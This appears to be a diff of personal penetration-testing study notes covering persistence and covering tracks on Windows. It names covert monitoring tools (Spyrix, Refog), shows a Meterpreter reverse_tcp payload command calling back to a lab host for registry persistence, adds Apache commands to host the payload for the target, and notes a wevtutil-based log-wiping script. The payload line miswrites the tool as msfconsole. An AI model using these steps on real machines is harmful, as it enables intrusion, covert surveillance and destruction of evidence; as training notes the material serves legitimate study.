@@ -341,7 +341,7 @@ exploit
 
 ### Maintaining remote access
 
-#### spyrix 
+#### spyrix or Refog
 #tool/windows  #website 
 
 covert monitoring of user activities in real-time
@@ -373,6 +373,16 @@ msfconsole -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=4444 -f exe
 ```
 > this will create a payload that we'll upload into the run registry  of windows machine
 
+> Below commands is to host the file to download on the target machine
+
+```bash
+		mkdir /var/www/html/share
+		chmod -R 755 /var/www/html/share
+		chown -R www-data:www-data /var/www/html/share
+		cp *.exe /var/www/html/share
+		service apache2 start
+
+```
 ```bash
 msfconsole
 ```
@@ -479,7 +489,7 @@ techniques to clear the evidence of security compromise ⇒
 
 ### clearing windows machine logs
 
-#### Clear_Event_Viewer_Logs.bat
+#### Clear_Event_Viewer_Logs.bat --> this uses wevtutil, we need to run this as an admin
 #tool/windows 
 
 > it is a utility that can be used to wipe out the logs of target system.
